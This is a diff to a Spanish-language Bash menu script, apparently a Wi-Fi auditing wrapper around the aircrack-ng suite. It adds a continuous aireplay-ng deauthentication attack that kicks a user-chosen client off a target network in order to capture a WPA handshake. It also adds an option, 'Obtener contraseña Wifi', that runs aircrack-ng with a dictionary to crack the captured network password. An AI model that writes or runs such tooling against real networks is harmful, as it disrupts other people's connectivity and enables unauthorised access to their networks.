@@ -116,18 +116,58 @@ wifiScanner(){
     echo -n "Escribe tu nombre de usuario del sistema: "
     read userSystem
     echo " "
+    echo "Se va a crear una carpeta en el escritorio, esta contendrá toda la información de la red Wifi seleccionada"
+    echo " "
+    sleep 4
     mkdir /home/$userSystem/Escritorio/$folderName
     cd /home/$userSystem/Escritorio/$folderName
     echo "A continuación vamos a ver la actividad sólo en $wifiName"
     echo " "
     sleep 3
     airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0
+    echo " "
+    echo -n "Escriba la dirección MAC del usuario al que desea deautenticar: "
+    read macClient
+    echo " "
+    echo "Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada"
+    echo " "
+    echo "Es recomendable esperar 1 minuto para que se genere el Handshake"
+    echo " "
+    echo "Cuando el minuto haya pasado, vuelva a ejecutar el programa y seleccione la opción 5"
+    echo " "
+    sleep 10
+    aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one $monitor
+
   else
     echo " "
     echo "Inicia el modo monitor primero"
     echo " "
     sleep 2
   fi
+
+}
+
+wifiPassword(){
+
+  echo " "
+  echo -n "Nombre del diccionario (póngalo en el escritorio, con extensión correspondiente): "
+  read dictionaryName
+  echo " "
+  echo -n "Nombre de la carpeta creada en el paso 4: "
+  read folderName
+  echo " "
+  echo -n "Nombre del archivo creado en el paso 4 (Con extensión correspondiente): "
+  read archiveName
+  echo " "
+  echo -n "Escribe tu nombre de usuario del sistema: "
+  read userSystem
+  echo " "
+  echo "Vamos a proceder a averiguar la contraseña"
+  echo " "
+  sleep 5
+  aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
+  sleep 10
+
 
 }
 
@@ -142,6 +182,7 @@ while true
     echo "2. Mostrar interfaces"
     echo "3. Dar de baja el modo monitor"
     echo "4. Escanear redes wifis"
+    echo "5. Obtener contraseña Wifi"
     echo "---------------------------"
     echo "0. Salir "
     echo "---------------------------"
@@ -160,6 +201,9 @@ while true
     fi
     if [ "$opcionMenu" = "4" ]; then
       wifiScanner
+    fi
+    if [ "$opcionMenu" = "5" ]; then
+      wifiPassword
     fi
     if [ "$opcionMenu" = "0" ]; then
       echo " "
